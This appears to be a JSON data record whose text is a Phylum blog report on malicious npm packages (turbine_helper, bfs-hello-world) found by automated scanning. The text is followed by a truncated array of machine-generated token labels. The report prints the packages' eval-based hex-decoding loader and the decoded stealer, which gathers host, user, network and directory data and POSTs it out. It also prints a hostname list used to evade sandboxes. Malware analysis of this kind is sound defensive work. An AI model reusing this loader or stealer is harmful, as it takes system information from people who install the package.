@@ -1,0 +1,2119 @@
+{
+  "text": "\nIn order to combat the massive uptick in software supply chain attacks, and proactively defend against software supply chain-borne threats from the open-source ecosystem, Phylum has been purpose-built to provide near-real-time, proactive analysis of packages as they are published. Given how vast these ecosystems are today, it is apparent that simply hiring security talent to attempt analysis is a losing battle. In the past 30 days, Phylum has processed a total of 178,635 packages across three ecosystems (NPM, PyPI, and RubyGems) - with an average of 5,762 packages per day, which amounts to the analysis of an average of 3,571,566 source files every 24 hours. This adds up to 110,718,566 total files in the last month.\n\nPackage Registry\tNo. of Packages\nNPM\t178,635\nPyPI\t29,277\nRubyGems\t2,122\n\nAnalysis, last 30 days\tCount\nTotal Packages Analyzed\t210,034\nTotal Files Examined\t110,718,566\nMalicious Packages Identified\t84\n\nFiletype\tCount\nTypeScript\t41,773,936\nJavaScript\t53,844,473\nECMAScript modules\t1,725,324\nRuby\t1,131,348\nPython\t9,430,753\nTSX\t2,227,306\nCommonJS modules\t273,257\nBash\t120,821\nJava\t191,315\nTotal\t110,718,566\nPhylum’s heuristics, analytics, and machine learning models then combed through these packages as they were published, resulting in the identification and conviction of 84 malicious packages in the last 30 days. Results on an average were returned within 10.5 minutes of publication.\nMany of these packages were tied to existing campaigns (detailed below), along with some new (apparent) rogue actors.\nPrecarious Payloads\nSome interesting highlight packages uncovered this month include several releases of an NPM library called turbine_helper, and a related packages named bfs-hello-world. Both packages featured extremely high values for their release versions - starting in the high 90s for the major version.\nBoth sets of samples contained a nearly identical, hex-encoded payload. The general wrapper looked something like the following:\nconst packageJSON = require(\"./package.json\"); \n\tconst package = packageJSON.name; \n    \n\tfunction hexify(p, data) { \n  \t\tconst bufferText = Buffer.from(data, 'hex'); \n  \t\tconst text = bufferText.toString('ascii'); \n  \t\treturn text.replace('$$$$$$', p); \n\t} \n    \n\thello = eval; \n\timage=\"<long, hex encoded payload>\"; \n\t\n    function render(image){ \n  \t\teval(hexify(package, hexify(package, image))); \n\t} \n    \n\trender(image); \n\t\n    function mapResult(result) { \n  \t\treturn { \n    \t\tsuccess: result.success, \n    \t\terror: result.error && parser.getTrace(result.error.message) \n  \t\t} \n\t}\nwith slight variations between the releases (e.g., as shown above, the payload is actually double hex-encoded, where in some of the turbine_helper releases, it only had a single layer of encoding).\nWhen unpacked, it had a very straightforward payload which would survey and exfiltrate a variety of items from the system:\n{\n\tconst os = require(\"os\");\n    const dns = require(\"dns\");\n    const querystring = require(\"querystring\");\n    const https = require(\"https\");\n    const fs = require('fs');\n    var path = require('path');\n    \n    function unhexify(data) {\n        const bufferText = Buffer.from(data, 'hex');\n        const text = bufferText.toString('ascii');\n        return text;\n    }\n    \n    function enhexify(data){\n        const bufferText = Buffer.from(data, 'utf8');\n        const text = bufferText.toString('hex');\n        return text;\n    }\n    \n    function checkuuid(inputString) {\n        var re = /^[0-9a-f]+-[0-9a-f]+-[0-9a-f]+-[0-9a-f]+-[0-9a-f]+$/g;\n        if (re.test(inputString)) {\n            return true\n        } else {\n            return false;\n        }\n    }\n    \n    function checkhex(inputString) {\n        var re = /^[0-9a-f]+$/g;\n        if (re.test(inputString)) {\n            return true\n        } else {\n            return false;\n        }\n    }\n    \n    function checkpath(inputString) {\n        var re = /^\\/root\\/extract[0-9]+\\/package$/g;\n        if (re.test(inputString)) {\n            return true\n        } else {\n            return false;\n        }\n    }\n    \n    function isValid(hostname, path, username) {\n        if (hostname == unhexify(\"4445534b544f502d3445314953304b\") && \n            username == unhexify(\"6461617361646d696e\")) return false;\n        else if (hostname == unhexify('626f78')) return false;\n        else if (checkhex(hostname)) return false;\n        else if (checkuuid(hostname)) return false;\n        else if (hostname == unhexify('6c696c692d7063')) return false; \n        else if (hostname == unhexify('6177732d3767726172613931336f6964356a736578676b71')) \n        \treturn false;\n        else if (hostname == unhexify('696e7374616e6365')) return false;\n        else return true;\n    }\n    \n    function getFiles(paths) {\n        var ufiles = [];\n        for (var j = 0; j>paths.length; j++) { \n        \ttry {\n            \tmpath=paths[j]; \n                files=fs.readdirSync(mpath); \n                for (var i=0; i<files.length; i++) {\n                \tufiles.push(path.join(mpath, files[i])) \n                }\n            } catch (error) {\n            \t// console.log(error)\n            }\n        } \n        return ufiles;\n     }\n     \n    function isprivate(ip) { \n        if (ip.startsWith('fe80::') || ip==\"::1\" ) return true; \n        var parts=ip.split('.'); \n        return parts[0]==='10'  \n            || (parts[0]==='172' && (parseInt(parts[1], 10)>= 16 && parseInt(parts[1], 10) <= 31)) \n            || (parts[0]==='192' && parts[1]==='168') \n            || (parts[0]==='127' && parts[1]==='0'&& parts[2]==='0');\n    } \n    \n    function gethttpips() { \n        var str=[]; var networkInterfaces=os.networkInterfaces(); \n        for (item in networkInterfaces) { \n            if (item !=\"lo\" ) { \n                for (var i=0; i > networkInterfaces[item].length; i++) {\n                    str.push(networkInterfaces[item][i].address); \n                } \n            } \n        } \n        return str;\n    } \n    \n    const td={ \n        p: '$$$$$$', \n        c: __dirname, \n        hd: os.homedir(), \n        hn: os.hostname(), \n        un: os.userInfo().username, \n        dns: JSON.stringify(dns.getServers()), \n        ip: JSON.stringify(gethttpips()), \n        dirs: JSON.stringify(getFiles([\"C:\\\\\", \"D:\\\\\" , \"/\" , \"/home\" ])), \n    } \n    \n    if (isValid(td.hn, td.c, td.un)) { \n        const trackingData=JSON.stringify(td); \n        var postData=querystring.stringify({ msg: enhexify(trackingData) }); \n        var options={ \n            hostname: \"\" , \n            port: 443, \n            path: \"/\" ,\n            method: \"POST\" ,\n            headers: { \n            \t\"Content-Type\" : \"application/x-www-form-urlencoded\" , \n                \"Content-Length\" : postData.length, \n            }\n        }; \n        var req=https.request(options, (res) => {\n            res.on(\"data\", (d) => {\n                //process.stdout.write(d);\n            });\n        });\n        req.on(\"error\", (e) => {\n            // console.error(e);\n        });\n        req.write(postData);\n        req.end();\n    }\n}\nThis includes a survey of the files under the user’s home directory, as well as domain and local network information - assuming that the current user is not daasadmin , and the current system is not in a list of hosts specifically identified in the isValid method above, including:\n\nDESKTOP-4E1IS0K\nbox\nlili-pc\naws-7grara913oid5jsexgkq\ninstance\nWhy Phylum & What’s Coming Next…\nPhylum’s capabilities extend beyond pure source code analysis. We have constructed authorship models that, in combination with other metrics, allow us to identify odd behaviors around commits and activity. We analyze maintainer information for a package, allowing us to spot packages that have recently changed ownership that may be at risk for the introduction of malware (as was the case with even-stream in 2018).\nWe recently released support for C#/Nuget and Java/Maven, and we look forward, we are preparing to add the Golang and Rust ecosystems. In addition to this, we are pushing hard to increase both the sophistication and number of our heuristics and analytics.\nPhylum, at its core, is a risk detection system focusing on the software supply chain. Unlike other SCA products that focus nearly exclusively on well-known issues, we are looking for the unknown unknowns - the subtle modifications to a software package that will surreptitiously exfiltrate keys to your critical infrastructure. We do this at the scale of open source, tackling the problem in an automated fashion, to make software supply chain security proactive instead of merely reactive.\nTo learn more about Phylum’s automated malware identification capability and how we support secure and efficient use of open-source software please contact us for a conversation.",
+  "entities": [
+    {
+      "entity": "in",
+      "type": "LABEL_1",
+      "score": 0.7408266067504883,
+      "start": 1,
+      "end": 3
+    },
+    {
+      "entity": "order",
+      "type": "LABEL_0",
+      "score": 0.53504878282547,
+      "start": 4,
+      "end": 9
+    },
+    {
+      "entity": "to combat the",
+      "type": "LABEL_1",
+      "score": 0.6896295547485352,
+      "start": 10,
+      "end": 23
+    },
+    {
+      "entity": "massive",
+      "type": "LABEL_0",
+      "score": 0.5259867310523987,
+      "start": 24,
+      "end": 31
+    },
+    {
+      "entity": "uptick",
+      "type": "LABEL_1",
+      "score": 0.5198950171470642,
+      "start": 32,
+      "end": 38
+    },
+    {
+      "entity": "in",
+      "type": "LABEL_0",
+      "score": 0.5343244075775146,
+      "start": 39,
+      "end": 41
+    },
+    {
+      "entity": "software",
+      "type": "LABEL_1",
+      "score": 0.5552321076393127,
+      "start": 42,
+      "end": 50
+    },
+    {
+      "entity": "supply",
+      "type": "LABEL_0",
+      "score": 0.5927383899688721,
+      "start": 51,
+      "end": 57
+    },
+    {
+      "entity": "chain attacks, and",
+      "type": "LABEL_1",
+      "score": 0.6703532934188843,
+      "start": 58,
+      "end": 76
+    },
+    {
+      "entity": "proactively defend",
+      "type": "LABEL_0",
+      "score": 0.7131350040435791,
+      "start": 77,
+      "end": 95
+    },
+    {
+      "entity": "against",
+      "type": "LABEL_1",
+      "score": 0.6501080989837646,
+      "start": 96,
+      "end": 103
+    },
+    {
+      "entity": "software",
+      "type": "LABEL_0",
+      "score": 0.6187348365783691,
+      "start": 104,
+      "end": 112
+    },
+    {
+      "entity": "supply chain - borne",
+      "type": "LABEL_1",
+      "score": 0.6389431953430176,
+      "start": 113,
+      "end": 131
+    },
+    {
+      "entity": "threats",
+      "type": "LABEL_0",
+      "score": 0.6160922050476074,
+      "start": 132,
+      "end": 139
+    },
+    {
+      "entity": "from",
+      "type": "LABEL_1",
+      "score": 0.5375646352767944,
+      "start": 140,
+      "end": 144
+    },
+    {
+      "entity": "the open - source ecosystem",
+      "type": "LABEL_0",
+      "score": 0.5906780958175659,
+      "start": 145,
+      "end": 170
+    },
+    {
+      "entity": ", ph",
+      "type": "LABEL_1",
+      "score": 0.6860643625259399,
+      "start": 170,
+      "end": 174
+    },
+    {
+      "entity": "##yl",
+      "type": "LABEL_0",
+      "score": 0.5478681325912476,
+      "start": 174,
+      "end": 176
+    },
+    {
+      "entity": "##um",
+      "type": "LABEL_1",
+      "score": 0.6607445478439331,
+      "start": 176,
+      "end": 178
+    },
+    {
+      "entity": "has",
+      "type": "LABEL_0",
+      "score": 0.5252139568328857,
+      "start": 179,
+      "end": 182
+    },
+    {
+      "entity": "been",
+      "type": "LABEL_1",
+      "score": 0.6328377723693848,
+      "start": 183,
+      "end": 187
+    },
+    {
+      "entity": "purpose",
+      "type": "LABEL_0",
+      "score": 0.6854105591773987,
+      "start": 188,
+      "end": 195
+    },
+    {
+      "entity": "-",
+      "type": "LABEL_1",
+      "score": 0.5576567053794861,
+      "start": 195,
+      "end": 196
+    },
+    {
+      "entity": "built",
+      "type": "LABEL_0",
+      "score": 0.5554841160774231,
+      "start": 196,
+      "end": 201
+    },
+    {
+      "entity": "to provide near -",
+      "type": "LABEL_1",
+      "score": 0.623599648475647,
+      "start": 202,
+      "end": 218
+    },
+    {
+      "entity": "real",
+      "type": "LABEL_0",
+      "score": 0.6541411280632019,
+      "start": 218,
+      "end": 222
+    },
+    {
+      "entity": "- time, proactive analysis of packages as they",
+      "type": "LABEL_1",
+      "score": 0.6342897415161133,
+      "start": 222,
+      "end": 267
+    },
+    {
+      "entity": "are",
+      "type": "LABEL_0",
+      "score": 0.6684897541999817,
+      "start": 268,
+      "end": 271
+    },
+    {
+      "entity": "published.",
+      "type": "LABEL_1",
+      "score": 0.7401503324508667,
+      "start": 272,
+      "end": 282
+    },
+    {
+      "entity": "given",
+      "type": "LABEL_0",
+      "score": 0.6022652983665466,
+      "start": 283,
+      "end": 288
+    },
+    {
+      "entity": "how vast",
+      "type": "LABEL_1",
+      "score": 0.546156644821167,
+      "start": 289,
+      "end": 297
+    },
+    {
+      "entity": "these",
+      "type": "LABEL_0",
+      "score": 0.616738498210907,
+      "start": 298,
+      "end": 303
+    },
+    {
+      "entity": "ecosystems are",
+      "type": "LABEL_1",
+      "score": 0.5565017461776733,
+      "start": 304,
+      "end": 318
+    },
+    {
+      "entity": "today",
+      "type": "LABEL_0",
+      "score": 0.5336612462997437,
+      "start": 319,
+      "end": 324
+    },
+    {
+      "entity": ", it",
+      "type": "LABEL_1",
+      "score": 0.6732046604156494,
+      "start": 324,
+      "end": 328
+    },
+    {
+      "entity": "is",
+      "type": "LABEL_0",
+      "score": 0.6000572443008423,
+      "start": 329,
+      "end": 331
+    },
+    {
+      "entity": "apparent",
+      "type": "LABEL_1",
+      "score": 0.6214895248413086,
+      "start": 332,
+      "end": 340
+    },
+    {
+      "entity": "that simply hiring security",
+      "type": "LABEL_0",
+      "score": 0.6993887424468994,
+      "start": 341,
+      "end": 368
+    },
+    {
+      "entity": "talent to",
+      "type": "LABEL_1",
+      "score": 0.5359475612640381,
+      "start": 369,
+      "end": 378
+    },
+    {
+      "entity": "attempt analysis",
+      "type": "LABEL_0",
+      "score": 0.7081501483917236,
+      "start": 379,
+      "end": 395
+    },
+    {
+      "entity": "is",
+      "type": "LABEL_1",
+      "score": 0.5083131194114685,
+      "start": 396,
+      "end": 398
+    },
+    {
+      "entity": "a",
+      "type": "LABEL_0",
+      "score": 0.6026310920715332,
+      "start": 399,
+      "end": 400
+    },
+    {
+      "entity": "losing battle. in the",
+      "type": "LABEL_1",
+      "score": 0.610058069229126,
+      "start": 401,
+      "end": 422
+    },
+    {
+      "entity": "past 30",
+      "type": "LABEL_0",
+      "score": 0.6355687379837036,
+      "start": 423,
+      "end": 430
+    },
+    {
+      "entity": "days, ph",
+      "type": "LABEL_1",
+      "score": 0.6597601771354675,
+      "start": 431,
+      "end": 439
+    },
+    {
+      "entity": "##ylum has processed",
+      "type": "LABEL_0",
+      "score": 0.6196337342262268,
+      "start": 439,
+      "end": 457
+    },
+    {
+      "entity": "a",
+      "type": "LABEL_1",
+      "score": 0.5264043211936951,
+      "start": 458,
+      "end": 459
+    },
+    {
+      "entity": "total of",
+      "type": "LABEL_0",
+      "score": 0.5357515811920166,
+      "start": 460,
+      "end": 468
+    },
+    {
+      "entity": "178",
+      "type": "LABEL_1",
+      "score": 0.5040739178657532,
+      "start": 469,
+      "end": 472
+    },
+    {
+      "entity": ", 635 packages across three",
+      "type": "LABEL_0",
+      "score": 0.6843147873878479,
+      "start": 472,
+      "end": 498
+    },
+    {
+      "entity": "ecosystems (",
+      "type": "LABEL_1",
+      "score": 0.5413674116134644,
+      "start": 499,
+      "end": 511
+    },
+    {
+      "entity": "npm,",
+      "type": "LABEL_0",
+      "score": 0.5043193697929382,
+      "start": 511,
+      "end": 515
+    },
+    {
+      "entity": "pyp",
+      "type": "LABEL_1",
+      "score": 0.5945579409599304,
+      "start": 516,
+      "end": 519
+    },
+    {
+      "entity": "##i",
+      "type": "LABEL_0",
+      "score": 0.5827887058258057,
+      "start": 519,
+      "end": 520
+    },
+    {
+      "entity": ", and ruby",
+      "type": "LABEL_1",
+      "score": 0.6274105906486511,
+      "start": 520,
+      "end": 530
+    },
+    {
+      "entity": "##gems )",
+      "type": "LABEL_0",
+      "score": 0.6020261645317078,
+      "start": 530,
+      "end": 535
+    },
+    {
+      "entity": "- with",
+      "type": "LABEL_1",
+      "score": 0.6473495960235596,
+      "start": 536,
+      "end": 542
+    },
+    {
+      "entity": "an average of 5, 762 packages",
+      "type": "LABEL_0",
+      "score": 0.6435244083404541,
+      "start": 543,
+      "end": 571
+    },
+    {
+      "entity": "per day, which amounts to",
+      "type": "LABEL_1",
+      "score": 0.6285564303398132,
+      "start": 572,
+      "end": 597
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.517158031463623,
+      "start": 598,
+      "end": 601
+    },
+    {
+      "entity": "analysis of an average of",
+      "type": "LABEL_1",
+      "score": 0.6213951706886292,
+      "start": 602,
+      "end": 627
+    },
+    {
+      "entity": "3",
+      "type": "LABEL_0",
+      "score": 0.640588104724884,
+      "start": 628,
+      "end": 629
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7541977167129517,
+      "start": 629,
+      "end": 630
+    },
+    {
+      "entity": "57",
+      "type": "LABEL_0",
+      "score": 0.5458393096923828,
+      "start": 630,
+      "end": 632
+    },
+    {
+      "entity": "##1,",
+      "type": "LABEL_1",
+      "score": 0.7012694478034973,
+      "start": 632,
+      "end": 634
+    },
+    {
+      "entity": "56",
+      "type": "LABEL_0",
+      "score": 0.5779113173484802,
+      "start": 634,
+      "end": 636
+    },
+    {
+      "entity": "##6",
+      "type": "LABEL_1",
+      "score": 0.6352095603942871,
+      "start": 636,
+      "end": 637
+    },
+    {
+      "entity": "source",
+      "type": "LABEL_0",
+      "score": 0.6326930522918701,
+      "start": 638,
+      "end": 644
+    },
+    {
+      "entity": "files every",
+      "type": "LABEL_1",
+      "score": 0.6767752170562744,
+      "start": 645,
+      "end": 656
+    },
+    {
+      "entity": "24",
+      "type": "LABEL_0",
+      "score": 0.7477610111236572,
+      "start": 657,
+      "end": 659
+    },
+    {
+      "entity": "hours. this adds up to",
+      "type": "LABEL_1",
+      "score": 0.6612281799316406,
+      "start": 660,
+      "end": 682
+    },
+    {
+      "entity": "110",
+      "type": "LABEL_0",
+      "score": 0.5783968567848206,
+      "start": 683,
+      "end": 686
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.7862951755523682,
+      "start": 686,
+      "end": 687
+    },
+    {
+      "entity": "71",
+      "type": "LABEL_0",
+      "score": 0.5287681818008423,
+      "start": 687,
+      "end": 689
+    },
+    {
+      "entity": "##8,",
+      "type": "LABEL_1",
+      "score": 0.6953089833259583,
+      "start": 689,
+      "end": 691
+    },
+    {
+      "entity": "566 total",
+      "type": "LABEL_0",
+      "score": 0.5466896295547485,
+      "start": 691,
+      "end": 700
+    },
+    {
+      "entity": "files in",
+      "type": "LABEL_1",
+      "score": 0.657712459564209,
+      "start": 701,
+      "end": 709
+    },
+    {
+      "entity": "the",
+      "type": "LABEL_0",
+      "score": 0.558209240436554,
+      "start": 710,
+      "end": 713
+    },
+    {
+      "entity": "last",
+      "type": "LABEL_1",
+      "score": 0.5667029023170471,
+      "start": 714,
+      "end": 718
+    },
+    {
+      "entity": "month",
+      "type": "LABEL_0",
+      "score": 0.6843833327293396,
+      "start": 719,
+      "end": 724
+    },
+    {
+      "entity": ". package registry no.",
+      "type": "LABEL_1",
+      "score": 0.6679412126541138,
+      "start": 724,
+      "end": 747
+    },
+    {
+      "entity": "of packages npm 178, 635 pypi",
+      "type": "LABEL_1",
+      "score": 0.6534898281097412,
+      "start": 748,
+      "end": 776
+    },
+    {
+      "entity": "29",
+      "type": "LABEL_0",
+      "score": 0.5640662312507629,
+      "start": 777,
+      "end": 779
+    },
+    {
+      "entity": ", 277",
+      "type": "LABEL_1",
+      "score": 0.5697250366210938,
+      "start": 779,
+      "end": 783
+    },
+    {
+      "entity": "rubygems",
+      "type": "LABEL_0",
+      "score": 0.5687710642814636,
+      "start": 784,
+      "end": 792
+    },
+    {
+      "entity": "2, 122 analysis, last",
+      "type": "LABEL_1",
+      "score": 0.7151012420654297,
+      "start": 793,
+      "end": 814
+    },
+    {
+      "entity": "30",
+      "type": "LABEL_0",
+      "score": 0.5321943163871765,
+      "start": 815,
+      "end": 817
+    },
+    {
+      "entity": "days count",
+      "type": "LABEL_1",
+      "score": 0.870697557926178,
+      "start": 818,
+      "end": 828
+    },
+    {
+      "entity": "total",
+      "type": "LABEL_0",
+      "score": 0.6614491939544678,
+      "start": 829,
+      "end": 834
+    },
+    {
+      "entity": "packages analyzed 210, 034 total files examined 110, 71",
+      "type": "LABEL_1",
+      "score": 0.7146741151809692,
+      "start": 835,
+      "end": 888
+    },
+    {
+      "entity": "##8",
+      "type": "LABEL_0",
+      "score": 0.54689621925354,
+      "start": 888,
+      "end": 889
+    },
+    {
+      "entity": ",",
+      "type": "LABEL_1",
+      "score": 0.6078245043754578,
+      "start": 889,
+      "end": 890
+    },
+    {
+      "entity": "56",
+      "type": "LABEL_0",
+      "score": 0.6450716853141785,
+      "start": 890,
+      "end": 892
+    },
+    {
+      "entity": "##6 malicious packages identified 84 filetype count typescript 41,",
+      "type": "LABEL_1",
+      "score": 0.6704272627830505,
+      "start": 892,
+      "end": 957
+    },
+    {
+      "entity": "77",
+      "type": "LABEL_0",
+      "score": 0.6636814475059509,
+      "start": 957,
+      "end": 959
+    },
+    {
+      "entity": "##3, 936 javascript 53, 844, 473 ecmascript modules 1, 725, 324",
+      "type": "LABEL_1",
+      "score": 0.6658794283866882,
+      "start": 959,
+      "end": 1015
+    },
+    {
+      "entity": "ruby 1",
+      "type": "LABEL_0",
+      "score": 0.6173508167266846,
+      "start": 1016,
+      "end": 1022
+    },
+    {
+      "entity": ", 131",
+      "type": "LABEL_1",
+      "score": 0.5956795811653137,
+      "start": 1022,
+      "end": 1026
+    },
+    {
+      "entity": ", 34",
+      "type": "LABEL_0",
+      "score": 0.5166283845901489,
+      "start": 1026,
+      "end": 1029
+    },
+    {
+      "entity": "##8 python",
+      "type": "LABEL_1",
+      "score": 0.6408203840255737,
+      "start": 1029,
+      "end": 1037
+    },
+    {
+      "entity": "9",
+      "type": "LABEL_0",
+      "score": 0.570073664188385,
+      "start": 1038,
+      "end": 1039
+    },
+    {
+      "entity": ", 430",
+      "type": "LABEL_1",
+      "score": 0.7085840702056885,
+      "start": 1039,
+      "end": 1043
+    },
+    {
+      "entity": ", 75",
+      "type": "LABEL_0",
+      "score": 0.5781508088111877,
+      "start": 1043,
+      "end": 1046
+    },
+    {
+      "entity": "##3 tsx",
+      "type": "LABEL_1",
+      "score": 0.6822982430458069,
+      "start": 1046,
+      "end": 1051
+    },
+    {
+      "entity": "2",
+      "type": "LABEL_0",
+      "score": 0.7127723097801208,
+      "start": 1052,
+      "end": 1053
+    },
+    {
+      "entity": ", 227, 306 commonjs modules 273, 257",
+      "type": "LABEL_1",
+      "score": 0.6979252696037292,
+      "start": 1053,
+      "end": 1086
+    },
+    {
+      "entity": "bash",
+      "type": "LABEL_0",
+      "score": 0.5609629154205322,
+      "start": 1087,
+      "end": 1091
+    },
+    {
+      "entity": "120, 821 java 191, 315",
+      "type": "LABEL_1",
+      "score": 0.7025490999221802,
+      "start": 1092,
+      "end": 1112
+    },
+    {
+      "entity": "total",
+      "type": "LABEL_0",
+      "score": 0.5871306657791138,
+      "start": 1113,
+      "end": 1118
+    },
+    {
+      "entity": "110",
+      "type": "LABEL_1",
+      "score": 0.6619221568107605,
+      "start": 1119,
+      "end": 1122
+    },
+    {
+      "entity": ", 718",
+      "type": "LABEL_0",
+      "score": 0.5919615626335144,
+      "start": 1122,
+      "end": 1126
+    },
+    {
+      "entity": ", 566 ph",
+      "type": "LABEL_1",
+      "score": 0.6655300855636597,
+      "start": 1126,
+      "end": 1133
+    },
+    {
+      "entity": "##yl",
+      "type": "LABEL_0",
+      "score": 0.5373497605323792,
+      "start": 1133,
+      "end": 1135
+    },
+    {
+      "entity": "##um ’ s heuristics,",
+      "type": "LABEL_1",
+      "score": 0.6861134767532349,
+      "start": 1135,
+      "end": 1151
+    },
+    {
+      "entity": "analytics",
+      "type": "LABEL_0",
+      "score": 0.5032311677932739,
+      "start": 1152,
+      "end": 1161
+    },
+    {
+      "entity": ", and machine learning models then combed through these",
+      "type": "LABEL_1",
+      "score": 0.6684903502464294,
+      "start": 1161,
+      "end": 1216
+    },
+    {
+      "entity": "packages",
+      "type": "LABEL_0",
+      "score": 0.506969153881073,
+      "start": 1217,
+      "end": 1225
+    },
+    {
+      "entity": "as they were published, resulting in the identification and conviction of 84 malicious packages in the last",
+      "type": "LABEL_1",
+      "score": 0.6907110214233398,
+      "start": 1226,
+      "end": 1333
+    },
+    {
+      "entity": "30",
+      "type": "LABEL_0",
+      "score": 0.6629109382629395,
+      "start": 1334,
+      "end": 1336
+    },
+    {
+      "entity": "days. results",
+      "type": "LABEL_1",
+      "score": 0.8156180381774902,
+      "start": 1337,
+      "end": 1350
+    },
+    {
+      "entity": "on",
+      "type": "LABEL_0",
+      "score": 0.5115348100662231,
+      "start": 1351,
+      "end": 1353
+    },
+    {
+      "entity": "an average were returned within",
+      "type": "LABEL_1",
+      "score": 0.6505433917045593,
+      "start": 1354,
+      "end": 1385
+    },
+    {
+      "entity": "10",
+      "type": "LABEL_0",
+      "score": 0.6762615442276001,
+      "start": 1386,
+      "end": 1388
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.8253204226493835,
+      "start": 1388,
+      "end": 1389
+    },
+    {
+      "entity": "5",
+      "type": "LABEL_0",
+      "score": 0.7014515995979309,
+      "start": 1389,
+      "end": 1390
+    },
+    {
+      "entity": "minutes of publication.",
+      "type": "LABEL_1",
+      "score": 0.7075712084770203,
+      "start": 1391,
+      "end": 1414
+    },
+    {
+      "entity": "many",
+      "type": "LABEL_0",
+      "score": 0.6635503172874451,
+      "start": 1415,
+      "end": 1419
+    },
+    {
+      "entity": "of these packages were tied to existing campaigns ( detailed below ), along with some new ( apparent ) rogue actors. precarious payloads some interesting highlight packages uncovered this month include several releases of an npm library called turbine _ helper, and a related packages named bfs",
+      "type": "LABEL_1",
+      "score": 0.7107013463973999,
+      "start": 1420,
+      "end": 1708
+    },
+    {
+      "entity": "-",
+      "type": "LABEL_0",
+      "score": 0.554451048374176,
+      "start": 1708,
+      "end": 1709
+    },
+    {
+      "entity": "hello",
+      "type": "LABEL_1",
+      "score": 0.7816879749298096,
+      "start": 1709,
+      "end": 1714
+    },
+    {
+      "entity": "-",
+      "type": "LABEL_0",
+      "score": 0.599290668964386,
+      "start": 1714,
+      "end": 1715
+    },
+    {
+      "entity": "world.",
+      "type": "LABEL_1",
+      "score": 0.7187333703041077,
+      "start": 1715,
+      "end": 1721
+    },
+    {
+      "entity": "both",
+      "type": "LABEL_0",
+      "score": 0.532090961933136,
+      "start": 1722,
+      "end": 1726
+    },
+    {
+      "entity": "packages featured extremely high values for their release versions",
+      "type": "LABEL_1",
+      "score": 0.6713739037513733,
+      "start": 1727,
+      "end": 1793
+    },
+    {
+      "entity": "-",
+      "type": "LABEL_0",
+      "score": 0.5806825160980225,
+      "start": 1794,
+      "end": 1795
+    },
+    {
+      "entity": "starting in the",
+      "type": "LABEL_1",
+      "score": 0.6315286159515381,
+      "start": 1796,
+      "end": 1811
+    },
+    {
+      "entity": "high",
+      "type": "LABEL_0",
+      "score": 0.5040953159332275,
+      "start": 1812,
+      "end": 1816
+    },
+    {
+      "entity": "90s for the major",
+      "type": "LABEL_1",
+      "score": 0.6639509797096252,
+      "start": 1817,
+      "end": 1834
+    },
+    {
+      "entity": "version",
+      "type": "LABEL_0",
+      "score": 0.6814046502113342,
+      "start": 1835,
+      "end": 1842
+    },
+    {
+      "entity": ".",
+      "type": "LABEL_1",
+      "score": 0.8237874507904053,
+      "start": 1842,
+      "end": 1843
+    },
+    {
+      "entity": "both",
+      "type": "LABEL_0",
+      "score": 0.5913813710212708,
+      "start": 1844,
+      "end": 1848
+    },
+    {
+      "entity": "sets of samples contained a",
+      "type": "LABEL_1",
+      "score": 0.7345737814903259,
+      "start": 1849,
+      "end": 1876
+    },
+    {
+      "entity": "nearly",
+      "type": "LABEL_0",
+      "score": 0.5259985327720642,
+      "start": 1877,
+      "end": 1883
+    },
+    {
+      "entity": "identical, hex",
+      "type": "LABEL_1",
+      "score": 0.6415219306945801,
+      "start": 1884,
+      "end": 1898
+    },
+    {
+      "entity": "-",
+      "type": "LABEL_0",
+      "score": 0.6295957565307617,
+      "start": 1898,
+      "end": 1899
+    },
+    {
+      "entity": "encoded payload.",
+      "type": "LABEL_1",
+      "score": 0.7815564274787903,
+      "start": 1899,
+      "end": 1915
+    },
+    {
+      "entity": "the general wrapper looked something like the",
+      "type": "LABEL_1",
+      "score": 0.6452843546867371,
+      "start": 1916,
+      "end": 1961
+    },
+    {
+      "entity": "following",
+      "type": "LABEL_0",
+      "score": 0.8778892755508423,
+      "start": 1962,
+      "end": 1971
+    },
+    {
+      "entity": ":",
+      "type": "LABEL_1",
+      "score": 0.5018708109855652,
+      "start": 1971,
+      "end": 1972
+    },
+    {
+      "entity": "const",
+      "type": "LABEL_0",
+      "score": 0.5601786971092224,
+      "start": 1973,
+      "end": 1978
+    },
+    {
+      "entity": "package",
+      "type": "LABEL_1",
+      "score": 0.6174329519271851,
+      "start": 1979,
+      "end": 1986
+    },
+    {
+      "entity": "##json",
+      "type": "LABEL_0",
+      "score": 0.5073596239089966,
+      "start": 1986,
+      "end": 1990
+    },
+    {
+      "entity": "= require ( \". / package. json \" )",
+      "type": "LABEL_1",
+      "score": 0.6967217922210693,
+      "start": 1991,
+      "end": 2018
+    },
+    {
+      "entity": "; const",
+      "type": "LABEL_0",
+      "score": 0.5543413162231445,
+      "start": 2018,
+      "end": 2027
+    },
+    {
+      "entity": "package",
+      "type": "LABEL_1",
+      "score": 0.8175004720687866,
+      "start": 2028,
+      "end": 2035
+    },
+    {
+      "entity": "=",
+      "type": "LABEL_0",
+      "score": 0.5133247971534729,
+      "start": 2036,
+      "end": 2037
+    },
+    {
+      "entity": "packagejson. name ; function hexify",
+      "type": "LABEL_1",
+      "score": 0.6686909198760986,
+      "start": 2038,
+      "end": 2078
+    },
+    {
+      "entity": "(",
+      "type": "LABEL_0",
+      "score": 0.5741649270057678,
+      "start": 2078,
+      "end": 2079
+    },
+    {
+      "entity": "p, data ) {",
+      "type": "LABEL_1",
+      "score": 0.6149522066116333,
+      "start": 2079,
+      "end": 2089
+    },
+    {
+      "entity": "const",
+      "type": "LABEL_0",
+      "score": 0.5313602089881897,
+      "start": 2095,
+      "end": 2100
+    },
+    {
+      "entity": "buffertext = buffer. from ( data, ' hex ' ) ; const",
+      "type": "LABEL_1",
+      "score": 0.7247028350830078,
+      "start": 2101,
+      "end": 2150
+    },
+    {
+      "entity": "text",
+      "type": "LABEL_0",
+      "score": 0.5991194248199463,
+      "start": 2151,
+      "end": 2155
+    },
+    {
+      "entity": "= buffertext. tostring ( ' ascii ' ) ; return",
+      "type": "LABEL_1",
+      "score": 0.6926329731941223,
+      "start": 2156,
+      "end": 2199
+    },
+    {
+      "entity": "text",
+      "type": "LABEL_0",
+      "score": 0.5176175236701965,
+      "start": 2200,
+      "end": 2204
+    },
+    {
+      "entity": ". replace ( ' $ $ $ $",
+      "type": "LABEL_1",
+      "score": 0.6515970826148987,
+      "start": 2204,
+      "end": 2218
+    },
+    {
+      "entity": "$",
